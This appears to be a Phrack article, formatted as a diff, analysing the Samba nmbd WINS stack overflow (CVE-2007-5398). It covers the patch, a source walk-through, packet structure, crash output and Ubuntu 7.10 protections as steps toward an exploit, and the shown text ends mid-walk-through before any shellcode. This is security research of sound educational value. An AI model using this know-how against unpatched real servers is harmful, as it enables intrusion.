@@ -1,0 +1,2395 @@
+                             ==Phrack Inc.==
+
+               Volume 0x0c, Issue 0x41, Phile #0x0c of 0x0f
+
+
+|=-----------------------------------------------------------------------=|
+|=-------------=[     The Art of Exploitation:      ]=-------------------=|
+|=---------=[ Technical analysis of Samba WINS stack overflow  ]=--------=|
+|=--------------------------=[ CVE-2007-5398 ]=--------------------------=|
+|=-----------------------------------------------------------------------=|
+|=-----------------------------------------------------------------------=|
+|=------------=[     By max_packetz@felinemenace.org     ]=--------------=|
+|=-----------------------------------------------------------------------=|
+
+--[ Index
+
+1 - Introduction
+2 - Initial Analysis
+3 - Ubuntu 7.10 Security mechanisms
+4 - Source code walk through
+5 - Writing an exploit for Samba Version 3.0.23c on FreeBSD 6.2
+  5.1 - Verifying valid registration flags
+  5.2 - Ordering the stack data correctly
+  5.3 - Code execution analysis
+  5.4 - Shellcode
+  5.5 - Getting a shell
+  5.6 - Making the exploit more reliable
+    5.6.1 - static .bss data
+    5.6.2 - Memory leak
+    5.6.2 - Back to the future^W.bss
+  5.7 - Additional exploitation notes
+6 - References
+
+--[ 1 - Introduction
+
+On the 15th November, 2007, the Samba team released a security advisory[1]
+detailing a stack overflow in the nmbd daemon, specifically in
+reply_netbios_packet() function in nmbd/nmbd_packets.c.
+
+This vulnerability requires a specific non-standard configuration 
+operation set in smb.conf for the code path to be enabled. Specifically,
+"wins support = yes" needs to be set. This specific vulnerability is not
+going to be present in a default install, nor likely to be found randomly.
+Apart from that, it's a relatively standard vulnerability, with nothing
+to set it apart. 
+
+This article will be my running commentary / analysis while analysing and
+exploiting this bug, every little editing of the article will take place 
+afterwards.. so if I make a stuff up / discover something applicable later
+on that I missed first time, you'll be able to read all about it.
+
+Initially, I will be concerned about how this affects Ubuntu 7.10 by 
+default, however, later on this may change if it turns out not to be
+exploitable, due to various protection mechanisms.
+
+--[ 2 - Initial Analysis
+
+The difference between samba-3.0.26 and samba-3.0.27 is shown directly
+below:
+
+---------------------------------------------
+--- samba-3.0.26/source/nmbd/nmbd_packets.c     
++++ samba-3.0.27/source/nmbd/nmbd_packets.c    
+@@ -963,6 +963,12 @@
+        nmb->answers->ttl      = ttl;
+   
+        if (data && len) {
++               if (len < 0 || len > sizeof(nmb->answers->rdata)) {
++                       DEBUG(5,("reply_netbios_packet: "
++                               "invalid packet len (%d)\n",
++                               len ));
++                       return;
++               }
+                nmb->answers->rdlength = len;
+                memcpy(nmb->answers->rdata, data, len);
+        }
+---------------------------------------------
+
+The additional checks it adds is immediately obvious what the problem is.
+Looking at the function declaration of the reply_netbios_packet() we 
+see:
+
+---------------------------------------------
+void reply_netbios_packet(struct packet_struct *orig_packet,
+	int rcode, enum netbios_reply_type_code rcv_code, int opcode,
+	int ttl, char *data, int len)
+{
+        struct packet_struct packet;
+        struct nmb_packet *nmb = NULL;
+        struct res_rec answers;
+        struct nmb_packet *orig_nmb = &orig_packet->packet.nmb;
+        BOOL loopback_this_packet = False;
+        int rr_type = RR_TYPE_NB;
+        const char *packet_type = "unknown";
+
+        /* Check if we are sending to or from ourselves. */
+        if( ismyip(orig_packet->ip) && 
+	    (orig_packet->port == global_nmb_port)
+	  )
+                loopback_this_packet = True;
+
+        nmb = &packet.packet.nmb;
+	..
+---------------------------------------------
+
+Checking the to see how much space is allocated in nmb->answers->rdata, 
+we see:
+
+---------------------------------------------
+/* A resource record. */
+struct res_rec {
+        struct nmb_name rr_name;
+        int rr_type;
+        int rr_class;
+        int ttl;
+        int rdlength;
+        char rdata[MAX_DGRAM_SIZE];
+};
+
+nameserv.h:#define MAX_DGRAM_SIZE (576) /* tcp/ip datagram limit 
+is 576 bytes */
+---------------------------------------------
+
+To trigger this vulnerability, we need to determine how to reach the
+code in a vulnerable state (with a large len field, greater than 576 
+bytes.)
+
+"grep -A 6 reply_netbios_ * | less" in source/nmbd, we see one that 
+looks particularly interesting, especially due to advisories mentioning 
+"wins support = yes" needing to be configured.
+
+---------------------------------------------
+nmbd_winsserver.c:    reply_netbios_packet(p,   /* Packet to reply to. */
+nmbd_winsserver.c-                   0,/* Result code. */
+nmbd_winsserver.c-                   WINS_QUERY,    /* nmbd type code. */
+nmbd_winsserver.c-                   NMB_NAME_QUERY_OPCODE,  /* opcode. */
+nmbd_winsserver.c-                   lp_min_wins_ttl(),      /* ttl. */
+nmbd_winsserver.c-                   prdata,           /* data to send. */
+nmbd_winsserver.c-                   num_ips*6);        /* data length. */
+----------------------------------------------
+
+Examining this code further we see that it's called in the 
+process_wins_dmb_query_request() function. It looks through all 
+registered hosts of the type 0x1b, counts them, allocates memory, 
+cycles through the linked list again, and records the IP address(es), and
+flags associated with that records. Further more, the code doesn't do any
+checks on the data it is about to pass into the reply_netbios_packet()
+function.
+
+Of specific interest in the process_wins_dmb_query_request() in
+nmbd_winsserver.c, the code is the 
+following:
+
+----------------------------------------------
+  for(i = 0; i < namerec->data.num_ips; i++) {
+    set_nb_flags(&prdata[num_ips * 6],namerec->data.nb_flags);
+    putip((char *)&prdata[(num_ips * 6) + 2], &namerec->data.ip[i]);
+    num_ips++;
+  }
+----------------------------------------------
+
+This is constructing the data to be memcpy()'d later on, in 6 byte
+increments. This could present a problem later on, as the stack layout
+may need to be controlled with extreme precision, and the nb_flags 
+details may be validated.
+
+Since this code path looks plausible, we'll start constructing some code
+to trigger this vulnerability.
+
+By doing a packet dump and loading it into WireShark[2], we can look for
+a WINS host being registered, and start working on an exploit. So far to 
+trigger this vulnerability from reading over the code, we need 
+approximately (576 / 6) registrations of type 0x1b, then we need to
+search for all 0x1b registrations.
+
+-----------------------------------------------
+NetBIOS Name Service
+    Transaction ID: 0x7b60
+    Flags: 0x2910 (Registration)
+        0... .... .... .... = Response: Message is a query
+        .010 1... .... .... = Opcode: Registration (5)
+        .... ..0. .... .... = Truncated: Message is not truncated
+        .... ...1 .... .... = Recursion desired: Do query recursively
+        .... .... ...1 .... = Broadcast: Broadcast packet
+    Questions: 1
+    Answer RRs: 0
+    Authority RRs: 0
+    Additional RRs: 1
+    Queries
+        VULN<20>: type NB, class IN
+            Name: VULN<20> (Server service)
+            Type: NB
+            Class: IN
+    Additional records
+        VULN<20>: type NB, class IN
+            Name: VULN<20> (Server service)
+            Type: NB
+            Class: IN
+            Time to live: 0 time
+            Data length: 6
+            Flags: 0x6000 (H-node, unique)
+                0... .... .... .... = Unique name
+                .11. .... .... .... = H-node
+            Addr: 10.1.1.3
+------------------------------------------------
+
+ * Transaction ID is any 16 bit value.
+ * Flags is specific value, and is 16 bit.
+ * Questions is a 16 bit value.
+ * Answer RRs is a 16 bit value.
+ * Authority RRs is a 16 bit value.
+ * Additional RRs is a 16 bit value.
+
+The "Queries" section is a 32 byte string, which encodes the type of
+registration, in addition with the type/class information. The 
+"Additional records" section has the name as 0xc0 0x0c, which seems to
+indicate to use the name previously unpacked. Further more, the type
+and class information is present, along with time to live, host flag
+information, and address information.
+
+It would appear that when registering is taking place, Samba extracts the
+flags field in the additional records, and the IP address information, 
+and inserts it into the linked list.
+
+With this knowledge, we can start our attempts at exploiting Samba by
+triggering the vulnerability. To reduce the amount of work that needs to
+be done, we'll use impacket [3] to reduce our work.
+
+After writing a preliminary exploit, we can verify the code path we choose
+was correct. The code to trigger the vulnerability is included. We will
+develop the exploit against a default install of Ubuntu 7.10 server 
+version.
+
+The crash looks like
+
+------------------------------------------------
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to Thread -1213143376 (LWP 31330)]
+0x080cd22e in ?? ()
+(gdb) x/10i $eip
+0x80cd22e:      cmp    (%ecx),%al
+0x80cd230:      jne    0x80cd242
+0x80cd232:      movzbl 0xffff0bde(%ebx),%eax
+0x80cd239:      cmp    0x1(%ecx),%al
+0x80cd23c:      je     0x80cd35d
+0x80cd242:      mov    0xffffffbc(%ebp),%edx
+0x80cd245:      lea    0xffffffe0(%ebp),%esi
+0x80cd248:      mov    0x50(%edx),%eax
+0x80cd24b:      movl   $0x20,0x8(%esp)
+0x80cd253:      mov    %edx,0x4(%esp)
+(gdb) i r ecx
+ecx            0x6b6a6968       1802135912
+(gdb) bt
+#0  0x080cd22e in ?? ()
+#1  0xbfe959c8 in ?? ()
+#2  0x08138721 in ?? ()
+#3  0x00000000 in ?? ()
+------------------------------------------------
+
+The value in ecx, 0x6b6a6968 is taken from the trigger code above, in the
+CreatePackets() function, in the ip variable. This at least gives us a 
+start in exploiting the service.
+
+--[ 3 - Ubuntu 7.10 Security mechanisms
+
+Here is a quick overview of the preventative security mechanisms I can 
+see in the default install of Ubuntu 7.10.
+
+ * dmesg shows NX (Execute Disable) protection: active
+ * /proc/pid/maps for nmbd looks like:
+
+-------------------------------------------------
+08048000-08145000 r-xp 00000000 08:01 462765     /usr/sbin/nmbd
+08145000-08150000 rw-p 000fc000 08:01 462765     /usr/sbin/nmbd
+08150000-081ea000 rw-p 08150000 00:00 0          [heap]
+...
+b7fdd000-b7ff7000 r-xp 00000000 08:01 279708     /lib/ld-2.6.1.so
+b7ff7000-b7ff9000 rw-p 00019000 08:01 279708     /lib/ld-2.6.1.so
+bfbc9000-bfbdf000 rw-p bfbc9000 00:00 0          [stack]
+ffffe000-fffff000 r-xp 00000000 00:00 0          [vdso]
+--------------------------------------------------
+
+So while non-execution may be active in some form, it looks like there may
+be some avenues via return-to-text, or jumping to the static vdso mapping.
+
+ * It appears there is a stack cookie implementation being used by the
+   compiler which made nmbd - due to strings output.
+
+--------------------------------------------------
+# strings /usr/sbin/nmbd | grep -i stack | head -n 1
+__stack_chk_fail
+---------------------------------------------------
+
+ * SuSE's apparmor is installed, though a cursory look it doesn't seem 
+   to be used?
+
+---------------------------------------------------
+# apparmor_status 
+apparmor module is loaded.
+0 profiles are loaded.
+0 profiles are in enforce mode.
+0 profiles are in complain mode.
+0 processes have profiles defined.
+0 processes are in enforce mode :
+0 processes are in complain mode.
+0 processes are unconfined but have a profile defined.
+---------------------------------------------------
+
+I'd hazard a guess that all memory regions are executable.. but we'll see 
+how it goes.
+
+So far, the only things that may hinder us a bit is that the:
+
+ * exploit is blind (unless a memory leak is found - which can be worked on
+   later.. or if we're lucky, the static memory address that we can use)
+ * memory randomisation (a little bit, we have a static .text, and a static
+   vdso)
+ * stack cookie checking may influence (either negatively, or positively) 
+   the avenues we have for exploiting the daemon.
+
+--[ 4 - Source code walk through
+
+To exploit the vulnerability, some of the things we need to do is:
+
+ * verify what flags field can be used, as our exploitation techniques may
+   need to keep this in mind, or our shellcode / addresses we use may be 
+   affected in some way.
+ * Analyze exactly what we're overflowing, and what is being affected by
+   the stack overwrite.
+ * Work out how to gain control of execution from the memory overwrite.
+
+To make exploit development easier, we can install the samba-dbg package
+that ships with Ubuntu 7.10. The samba-dbg package has applicable symbols
+for the samba binaries / libraries. This may significantly help us exploit
+the vulnerability, as it will provide variable names, function information,
+and so fourth.
+
+Since we have triggered the vulnerability, it's probably a good idea to 
+start from reading the packets in, and finding where the memory is being 
+used / defined, and work our way forwards to the memcpy(), then following 
+what happens there.
+
+The nmbd server has a main processing loop, called process() funnily 
+enough, in nmbd/nmbd.c.
+
+It reads in and queues the network packets, then processes the packets 
+as shown below:
+
+------------------------------------------
+		/*
+		 * Read incoming UDP packets.
+		 * (nmbd_packets.c)
+		 */
+
+		if(listen_for_packets(run_election))
+			return;
+
+		...
+
+		/*
+		 * Process all incoming packets
+		 * read above. This calls the success and
+		 * failure functions registered when response
+		 * packets arrrive, and also deals with request
+		 * packets from other sources.
+		 * (nmbd_packets.c)
+		 */
+
+		run_packet_queue();
+-------------------------------------------
+
+Which hands off execution to the nmbd/nmbd_packets.c file, in
+run_packet_queue()
+
+run_packet_queue() runs through the list of packets (as the name would
+suggest), identifying if it is NMB packet, or a "dgram" packet. If it is a 
+NMB packet, it checks to see whether or not it is a request, or a response.
+
+As we're dealing with a request type, it hands off execution to
+process_nmb_request() (which is in the same file as before,
+nmbd/nmbd_packets.c).
+
+process_nmb_request() examines the opcode, and hands off execution to
+wins_process_name_query_request() in nmbd/nmbd_winsserver.c
+
+A partial extract of the wins_process_name_query_request() is shown below:
+
+--------------------------------------------
+1879 /*********************************************************************
+1880  Deal with a name query.
+1881 *********************************************************************/
+1882 
+1883 void wins_process_name_query_request(struct subnet_record *subrec,
+1884                                      struct packet_struct *p)
+1885 {
+1886         struct nmb_packet *nmb = &p->packet.nmb;
+1887         struct nmb_name *question = &nmb->question.question_name;
+1888         struct name_record *namerec = NULL;
+1889         unstring qname;
+1890 
+1891 DEBUG(3,(
+         "wins_process_name_query: name query for name %s from IP %s\n",
+1892                 nmb_namestr(question), inet_ntoa(p->ip) ));
+1893 
+1894         /*
+1895          * Special name code. If the queried name is *<1b> then search
+1896          * the entire WINS database and return a list of all the IP 
+                addresses
+1897          * registered to any <1b> name. This is to allow domain master
+                browsers
+1898          * to discover other domains that may not have a presence on 
+                their subnet.
+1899          */
+1900 
+1901         pull_ascii_nstring(qname, sizeof(qname), question->name);
+1902         if(strequal( qname, "*") && (question->name_type == 0x1b)) {
+1903                 process_wins_dmb_query_request( subrec, p);
+1904                 return;
+1905         }
+1906
+--------------------------------------------
+
+Since our trigger packet matches the requirement at 1902, we then jump 
+on to process_wins_dmb_query_request again in nmbd_winsserver.c. Some 
+comments are inline.
+
+
+--------------------------------------------
+1749 /********************************************************************
+1750  Deal with the special name query for *<1b>
+1751 ********************************************************************/
+1752 
+1753 static void process_wins_dmb_query_request(
+                                             struct subnet_record *subrec,
+1754                                         struct packet_struct *p)
+1755 {
+1756         struct name_record *namerec = NULL;
+1757         char *prdata;
+1758         int num_ips;
+1759 
+1760         /*
+1761          * Go through all the ACTIVE names in the WINS db looking for 
+                those
+1762          * ending in <1b>. Use this to calculate the number of IP
+1763          * addresses we need to return.
+1764          */
+1765 
+1766         num_ips = 0;
+1767 
+1768         /* First, clear the in memory list - we're going to 
+                re-populate
+1769            it with the tdb_traversal in 
+                fetch_all_active_wins_1b_names. */
+1770 
+1771         wins_delete_all_tmp_in_memory_records();
+1772 
+1773         fetch_all_active_wins_1b_names();
+1774 
+1775         for( namerec = subrec->namelist; namerec; namerec = 
+                             namerec->next ) {
+1776             if( WINS_STATE_ACTIVE(namerec) && 
+                           namerec->name.name_type == 0x1b) {
+1777                         num_ips += namerec->data.num_ips;
+
+Count how many IP addresses are active, per registration.
+
+1778                 }
+1779         }
+1780 
+1781         if(num_ips == 0) {
+
+None? then bail. 
+
+1782                 /*
+1783                  * There are no 0x1b names registered. 
+                        Return name query fail.
+1784                  */
+1785                 send_wins_name_query_response(NAM_ERR, p, NULL);
+1786                 return;
+1787         }
+1788 
+1789         if((prdata = (char *)SMB_MALLOC( num_ips * 6 )) == NULL) {
+
+Allocate required temporary memory. free()'d at end of function.
+
+1790         DEBUG(0,("process_wins_dmb_query_request: Malloc fail !.\n"));
+1791                 return;
+1792         }
+1793 
+1794         /*
+1795          * Go through all the names again in the WINS db looking for 
+                those
+1796          * ending in <1b>. Add their IP addresses into the list 
+                we will
+1797          * return.
+1798          */
+1799 
+1800         num_ips = 0;
+1801         for( namerec = subrec->namelist; namerec; namerec = 
+                  namerec->next ) {
+1802                 if( WINS_STATE_ACTIVE(namerec) && 
+                              namerec->name.name_type == 0x1b) {
+
+Scan through the linked list of name records, finding suitable records that
+meet the above requirements.
+
+1803                         int i;
+1804                         for(i = 0; i < namerec->data.num_ips; i++) {
+1805                                 set_nb_flags(&prdata[num_ips * 6],
+                                     namerec->data.nb_flags);
+1806                                 putip((char *)&
+                         prdata[(num_ips * 6) + 2], &namerec->data.ip[i]);
+1807                                 num_ips++;
+1808                         }
+
+Copy the data into the allocated memory. Memory is formatted of the type:
+[2 byte flags field][4 byte ip address]
+
+1809                 }
+1810         }
+1811 
+1812         /*
+1813          * Send back the reply containing the IP list.
+1814          */
+1815 
+1816         reply_netbios_packet(p,              /* Packet to reply to. */
+1817                       0,                     /* Result code. */
+1818                       WINS_QUERY,            /* nmbd type code. */
+1819                       NMB_NAME_QUERY_OPCODE,         /* opcode. */
+1820                       lp_min_wins_ttl(),             /* ttl. */
+1821                       prdata,                     /* data to send. */
+1822                       num_ips*6);                 /* data length. */
+1823 
+
+Call reply_netbios_packet. If reached where num_ips*6 > 576, it will 
+trigger the vulnerability.
+
+1824         SAFE_FREE(prdata);
+1825 }
+1826 
+--------------------------------------------
+
+And looking at reply_netbios_packet(), we see:
+
+--------------------------------------------
+ 856 /*******************************************************************
+ 857   Reply to a netbios name packet.  see rfc1002.txt
+ 858 ********************************************************************/
+ 859 
+ 860 void reply_netbios_packet(struct packet_struct *orig_packet,
+ 861                           int rcode, enum netbios_reply_type_code 
+                               rcv_code, 
+                               int opcode,
+ 862                           int ttl, char *data,int len)
+ 863 {
+ 864         struct packet_struct packet;
+
+Locally defined struct packet on the stack
+
+ 865         struct nmb_packet *nmb = NULL;
+ 866         struct res_rec answers;
+
+Locally defined res_rec on the stack.
+
+ 867         struct nmb_packet *orig_nmb = &orig_packet->packet.nmb;
+ 868         BOOL loopback_this_packet = False;
+ 869         int rr_type = RR_TYPE_NB;
+ 870         const char *packet_type = "unknown";
+ 871 
+ 872         /* Check if we are sending to or from ourselves. */
+ 873         if(ismyip(orig_packet->ip) && (orig_packet->port == 
+                global_nmb_port))
+ 874                 loopback_this_packet = True;
+ 875 
+ 876         nmb = &packet.packet.nmb;
+
+Point nmb inside of the above locally declared packet.
+
+ 877 
+ 878         /* Do a partial copy of the packet. We clear the locked flag
+              and
+ 879                         the resource record pointers. */
+ 880         packet = *orig_packet;   /* Full structure copy. */
+ 881         packet.locked = False;
+
+Build the nmb packet response
+
+ 882         nmb->answers = NULL;
+ 883         nmb->nsrecs = NULL;
+ 884         nmb->additional = NULL;
+ 885 
+ 886         switch (rcv_code) {
+ 887                 case NMB_STATUS:
+ 888                         packet_type = "nmb_status";
+ 889                        nmb->header.nm_flags.recursion_desired = False;
+ 890                      nmb->header.nm_flags.recursion_available = False;
+ 891                         rr_type = RR_TYPE_NBSTAT;
+ 892                         break;
+ 893                 case NMB_QUERY:
+ 894                         packet_type = "nmb_query";
+ 895                        nmb->header.nm_flags.recursion_desired = True;
+ 896                      nmb->header.nm_flags.recursion_available = True;
+ 897                         if (rcode) {
+ 898                                 rr_type = RR_TYPE_NULL;
+ 899                         }
+ 900                         break;
+ 901                 case NMB_REG:
+ 902                 case NMB_REG_REFRESH:
+ 903                         packet_type = "nmb_reg";
+ 904                       nmb->header.nm_flags.recursion_desired = True;
+ 905                      nmb->header.nm_flags.recursion_available = True;
+ 906                         break;
+ 907                 case NMB_REL:
+ 908                         packet_type = "nmb_rel";
+ 909                       nmb->header.nm_flags.recursion_desired = False;
+ 910                     nmb->header.nm_flags.recursion_available = False;
+ 911                         break;
+ 912                 case NMB_WAIT_ACK:
+ 913                         packet_type = "nmb_wack";
+ 914                       nmb->header.nm_flags.recursion_desired = False;
+ 915                     nmb->header.nm_flags.recursion_available = False;
+ 916                         rr_type = RR_TYPE_NULL;
+ 917                         break;
+ 918                 case WINS_REG:
+ 919                         packet_type = "wins_reg";
+ 920                       nmb->header.nm_flags.recursion_desired = True;
+ 921                      nmb->header.nm_flags.recursion_available = True;
+ 922                         break;
+ 923                 case WINS_QUERY:
+ 924                         packet_type = "wins_query";
+ 925                      nmb->header.nm_flags.recursion_desired = True;
+ 926                      nmb->header.nm_flags.recursion_available = True;
+ 927                         if (rcode) {
+ 928                                 rr_type = RR_TYPE_NULL;
+ 929                         }
+ 930                         break;
+ 931                 default:
+ 932 DEBUG(0,(
+           "reply_netbios_packet: Unknown packet type: %s %s to ip %s\n",
+ 933          packet_type, nmb_namestr(&orig_nmb->question.question_name),
+ 934                                 inet_ntoa(packet.ip)));
+ 935                         return;
+ 936         }
+ 937 
+ 938         DEBUG(4,(
+   "reply_netbios_packet: sending a reply of packet type: %s %s to ip %s \
+ 939 for id %hu\n", packet_type, nmb_namestr
+            (&orig_nmb->question.question_name),
+ 940              inet_ntoa(packet.ip), orig_nmb->header.name_trn_id));
+ 941 
+ 942         nmb->header.name_trn_id = orig_nmb->header.name_trn_id;
+ 943         nmb->header.opcode = opcode;
+ 944         nmb->header.response = True;
+ 945         nmb->header.nm_flags.bcast = False;
+ 946         nmb->header.nm_flags.trunc = False;
+ 947         nmb->header.nm_flags.authoritative = True;
+ 948 
+ 949         nmb->header.rcode = rcode;
+ 950         nmb->header.qdcount = 0;
+ 951         nmb->header.ancount = 1;
+ 952         nmb->header.nscount = 0;
+ 953         nmb->header.arcount = 0;
+ 954 
+
+Finished building the nmb packet header, now on with the show.
+
+ 955         memset((char*)&nmb->question,'\0',sizeof(nmb->question));
+ 956 
+ 957         nmb->answers = &answers;
+ 958         memset((char*)nmb->answers,'\0',sizeof(*nmb->answers));
+
+Setup nmb->answers, zero the memory.
+
+ 959 
+ 960         nmb->answers->rr_name  = orig_nmb->question.question_name;
+ 961         nmb->answers->rr_type  = rr_type;
+ 962         nmb->answers->rr_class = RR_CLASS_IN;
+ 963         nmb->answers->ttl      = ttl;
+ 964 
+ 965         if (data && len) {
+ 966                 nmb->answers->rdlength = len;
+ 967                 memcpy(nmb->answers->rdata, data, len);
+
+Trigger the overflow, which writes into the function allocated copy of
+answers->rdata, which is defined/mentioned above as:
+
+/* A resource record. */
+struct res_rec {
+        struct nmb_name rr_name;
+        int rr_type;
+        int rr_class;
+        int ttl;
+        int rdlength;
+        char rdata[MAX_DGRAM_SIZE];
+};
+
+nameserv.h:#define MAX_DGRAM_SIZE (576) 
+/* tcp/ip datagram limit is 576 bytes */
+
+ 968         }
+ 969 
+ 970         packet.packet_type = NMB_PACKET;
+ 971         /* Ensure we send out on the same fd that the original
+ 972                 packet came in on to give the correct source IP 
+             address. */
+ 973         packet.fd = orig_packet->fd;
+ 974         packet.timestamp = time(NULL);
+ 975 
+ 976         debug_nmb_packet(&packet);
+ 977 
+ 978         if(loopback_this_packet) {
+ 979                 struct packet_struct *lo_packet;
+ 980                 DEBUG(5,(
+         "reply_netbios_packet: sending packet to ourselves.\n"));
+ 981                 if((lo_packet = copy_packet(&packet)) == NULL)
+ 982                         return;
+ 983                 queue_packet(lo_packet);
+ 984         } else if (!send_packet(&packet)) {
+ 985                 DEBUG(0,(
+          "reply_netbios_packet: send_packet to IP %s port %d failed\n",
+ 986                         inet_ntoa(packet.ip),packet.port));
+ 987         }
+ 988 }
+ 989 
+--------------------------------------------
+
+Unfortunately, since we saw mention of stack cookies and checks, it appears
+that we can't just overwrite the saved eip and test if we have code 
+execution - indeed, running the exploit with too few registrations provide
+us with the message of:
+
+--------------------------------------------
+*** stack smashing detected ***: /usr/sbin/nmbd terminated
+--------------------------------------------
+
+This means that it's probable we'll have to see what we can get away with
+in the processing of send_packet(). send_packet() is located in 
+libsmb/nmblib.c
+
+Looking at send_packet(), we find the following:
+
+--------------------------------------------
+ 982 /*******************************************************************
+ 983  Send a packet_struct.
+ 984 ******************************************************************/
+ 985 
+ 986 BOOL send_packet(struct packet_struct *p)
+ 987 {
+ 988         char buf[1024];
+ 989         int len=0;
+ 990 
+ 991         memset(buf,'\0',sizeof(buf));
+ 992 
+ 993         len = build_packet(buf, p);
+ 994 
+ 995         if (!len)
+ 996                 return(False);
+ 997 
+ 998         return(send_udp(p->fd,buf,len,p->ip,p->port));
+ 999 }
+1000 
+--------------------------------------------
+
+The "char buf[1024];" looks interesting, and maybe useful. 
+
+Followed by the obvious:
+
+--------------------------------------------
+ 961 /*******************************************************************
+ 962  Linearise a packet.
+ 963 ******************************************************************/
+ 964 
+ 965 int build_packet(char *buf, struct packet_struct *p)
+ 966 {
+ 967         int len = 0;
+ 968 
+ 969         switch (p->packet_type) {
+ 970         case NMB_PACKET:
+ 971                 len = build_nmb(buf,p);
+ 972                 break;
+ 973 
+ 974         case DGRAM_PACKET:
+ 975                 len = build_dgram(buf,p);
+ 976                 break;
+ 977         }
+ 978 
+ 979         return len;
+ 980 }
+--------------------------------------------
+
+Followed by the call once again, to build_nmb():
+
+--------------------------------------------
+ 881 /*******************************************************************
+ 882  Build a nmb packet ready for sending.
+ 883 
+ 884  XXXX this currently relies on not being passed something that expands
+ 885  to a packet too big for the buffer. Eventually this should be
+ 886  changed to set the trunc bit so the receiver can request the rest
+ 887  via tcp (when that becomes supported)
+ 888 ******************************************************************/
+ 889 
+ 890 static int build_nmb(char *buf,struct packet_struct *p)
+ 891 {
+ 892         struct nmb_packet *nmb = &p->packet.nmb;
+ 893         unsigned char *ubuf = (unsigned char *)buf;
+ 894         int offset=0;
+ 895 
+ 896         /* put in the header */
+ 897         RSSVAL(ubuf,offset,nmb->header.name_trn_id);
+ 898         ubuf[offset+2] = (nmb->header.opcode & 0xF) << 3;
+ 899         if (nmb->header.response)
+ 900                 ubuf[offset+2] |= (1<<7);
+ 901         if (nmb->header.nm_flags.authoritative &&
+ 902                         nmb->header.response)
+ 903                 ubuf[offset+2] |= 0x4;
+ 904         if (nmb->header.nm_flags.trunc)
+ 905                 ubuf[offset+2] |= 0x2;
+ 906         if (nmb->header.nm_flags.recursion_desired)
+ 907                 ubuf[offset+2] |= 0x1;
+ 908         if (nmb->header.nm_flags.recursion_available &&
+ 909                         nmb->header.response)
+ 910                 ubuf[offset+3] |= 0x80;
+ 911         if (nmb->header.nm_flags.bcast)
+ 912                 ubuf[offset+3] |= 0x10;
+ 913         ubuf[offset+3] |= (nmb->header.rcode & 0xF);
+ 914 
+ 915         RSSVAL(ubuf,offset+4,nmb->header.qdcount);
+ 916         RSSVAL(ubuf,offset+6,nmb->header.ancount);
+ 917         RSSVAL(ubuf,offset+8,nmb->header.nscount);
+ 918         RSSVAL(ubuf,offset+10,nmb->header.arcount);
+ 919 
+ 920         offset += 12;
+ 921         if (nmb->header.qdcount) {
+ 922                 /* XXXX this doesn't handle a qdcount of > 1 */
+ 923                 offset += put_nmb_name((char *)ubuf,offset,
+                     &nmb->question.question_name);
+ 924                 RSSVAL(ubuf,offset,nmb->question.question_type);
+ 925                 RSSVAL(ubuf,offset+2,nmb->question.question_class);
+ 926                 offset += 4;
+ 927         }
+ 928 
+ 929         if (nmb->header.ancount)
+ 930                 offset += 
+                       put_res_rec((char *)ubuf,offset,nmb->answers,
+ 931                                 nmb->header.ancount);
+ 932 
+ 933         if (nmb->header.nscount)
+ 934                 offset += put_res_rec((char *)ubuf,offset,nmb->nsrecs,
+ 935                                 nmb->header.nscount);
+ 936 
+ 937         /*
+ 938          * The spec says we must put compressed name pointers
+ 939          * in the following outgoing packets :
+ 940          * NAME_REGISTRATION_REQUEST, NAME_REFRESH_REQUEST,
+ 941          * NAME_RELEASE_REQUEST.
+ 942          */
+ 943 
+ 944         if((nmb->header.response == False) &&
+ 945           ((nmb->header.opcode == NMB_NAME_REG_OPCODE) ||
+ 946           (nmb->header.opcode == NMB_NAME_RELEASE_OPCODE) ||
+ 947           (nmb->header.opcode == NMB_NAME_REFRESH_OPCODE_8) ||
+ 948           (nmb->header.opcode == NMB_NAME_REFRESH_OPCODE_9) ||
+ 949           (nmb->header.opcode == NMB_NAME_MULTIHOMED_REG_OPCODE)) &&
+ 950           (nmb->header.arcount == 1)) {
+ 951 
+ 952     offset += put_compressed_name_ptr(ubuf,offset,nmb->additional,12);
+ 953 
+ 954         } else if (nmb->header.arcount) {
+ 955             offset += put_res_rec((char *)ubuf,offset,nmb->additional,
+ 956                         nmb->header.arcount);
+ 957         }
+ 958         return(offset);
+ 959 }
+--------------------------------------------
+
+Following the call to put_res_rec(), we see:
+
+--------------------------------------------
+ 388 
+ 389 /*******************************************************************
+ 390  Put a resource record into a packet.
+ 391 ******************************************************************/
+ 392 
+ 393 static int put_res_rec(char *buf,int offset,struct res_rec *recs,
+            int count)
+ 394 {
+ 395         int ret=0;
+ 396         int i;
+ 397 
+ 398         for (i=0;i<count;i++) {
+ 399                 int l = put_nmb_name(buf,offset,&recs[i].rr_name);
+ 400                 offset += l;
+ 401                 ret += l;
+ 402                 RSSVAL(buf,offset,recs[i].rr_type);
+ 403                 RSSVAL(buf,offset+2,recs[i].rr_class);
+ 404                 RSIVAL(buf,offset+4,recs[i].ttl);
+ 405                 RSSVAL(buf,offset+8,recs[i].rdlength);
+ 406                 memcpy(buf+offset+10,recs[i].rdata,recs[i].rdlength);
+ 407                 offset += 10+recs[i].rdlength;
+ 408                 ret += 10+recs[i].rdlength;
+ 409         }
+ 410 
+ 411         return(ret);
+ 412 }
+ 413 
+--------------------------------------------
+
+And following up with put_nmb_name():
+
+--------------------------------------------
+ 279 /*******************************************************************
+ 280  Put a compressed nmb name into a buffer. Return the length of the
+ 281  compressed name.
+ 282 
+ 283  Compressed names are really weird. The "compression" doubles the
+ 284  size. The idea is that it also means that compressed names conform
+ 285  to the doman name system. See RFC1002.
+ 286 ******************************************************************/
+ 287 
+ 288 static int put_nmb_name(char *buf,int offset,struct nmb_name *name)
+ 289 {
+ 290         int ret,m;
+ 291         nstring buf1;
+ 292         char *p;
+ 293 
+ 294         if (strcmp(name->name,"*") == 0) {
+ 295                 /* special case for wildcard name */
+ 296                 put_name(buf1, "*", '\0', name->name_type);
+ 297         } else {
+ 298                 put_name(buf1, name->name, ' ', name->name_type);
+ 299         }
+ 300 
+ 301         buf[offset] = 0x20;
+ 302 
+ 303         ret = 34;
+ 304 
+ 305         for (m=0;m<MAX_NETBIOSNAME_LEN;m++) {
+ 306                 buf[offset+1+2*m] = 'A' + ((buf1[m]>>4)&0xF);
+ 307                 buf[offset+2+2*m] = 'A' + (buf1[m]&0xF);
+ 308         }
+ 309         offset += 33;
+ 310 
+ 311         buf[offset] = 0;
+ 312 
+ 313         if (name->scope[0]) {
+ 314                 /* XXXX this scope handling needs testing */
+ 315                 ret += strlen(name->scope) + 1;
